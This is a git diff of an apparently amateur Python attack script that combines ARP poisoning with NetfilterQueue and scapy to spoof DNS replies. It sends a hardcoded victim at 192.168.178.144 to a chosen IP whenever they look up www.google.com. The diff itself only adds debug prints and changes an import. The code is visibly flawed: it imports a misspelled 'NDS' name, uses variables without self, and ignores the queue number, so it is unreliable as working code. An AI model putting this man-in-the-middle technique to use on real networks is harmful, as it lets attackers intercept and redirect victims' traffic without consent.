@@ -1,5 +1,5 @@
 from typing import Any
-from netfilterqueue import NetFilterQueue
+from NetfilterQueue import NetFilterQueue
 import os
 import ArpPoison
 import threading
@@ -8,11 +8,12 @@ from scapy.all import IP, UDP, NDS, DNSRR, DNSQR, Ether
 class Dns_spoof:
 
     def __init__(self, queue_num, ipVictim, ipServer, host) -> None:
+        print('in init')
         self.queue_num = 1
         self.pktCounter = 0
 
     def __call__(self) -> None:
-
+        print('in call')
         arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
         arpThread.start()
 
@@ -29,6 +30,7 @@ class Dns_spoof:
             print("iptables flushed")
         
     def call_back(bin_packet):
+        print('packet being processed')
         packet = IP(bin_packet.get_payload())
         if packet.haslayer(DNSRR):
             try:
@@ -44,9 +46,11 @@ class Dns_spoof:
             except IndexError as error:
                 return False
             bin_packet.set_payload(bytes(packet))
+        print('packet has been processed')    
         return bin_packet.accept()
 
 if __name__ == '__main__':
+    print('in main')
     host = ("www.google.com", "188.114.96.0")
     queue_num = 1
     ipVictim = '192.168.178.144' # The IP address of the victim
